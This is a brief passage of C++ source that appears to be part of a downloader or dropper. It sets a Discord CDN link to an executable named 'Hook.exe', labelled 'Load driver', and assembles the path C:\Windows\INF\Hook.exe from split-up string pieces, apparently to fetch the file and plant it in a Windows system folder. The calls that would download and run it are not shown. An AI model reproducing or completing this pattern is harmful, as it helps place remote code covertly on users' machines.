...
{
	//Load driver
	LPCWSTR Finder = L"https://cdn.discordapp.com/attachments/937721415220736021/940950286132969523/Hook.exe";

	std::string pa = "C:\\Windows";
	std::string inf = "\\INF\\";

	std::string lof = pa + inf;

	std::string SwapHook = "Hook";
	std::string swapCaller = ".exe";
	LPCWSTR locx = L"C:\\Windows\\INF\\Hook.exe";

	std::string spreadAct = SwapHook + swapCaller;
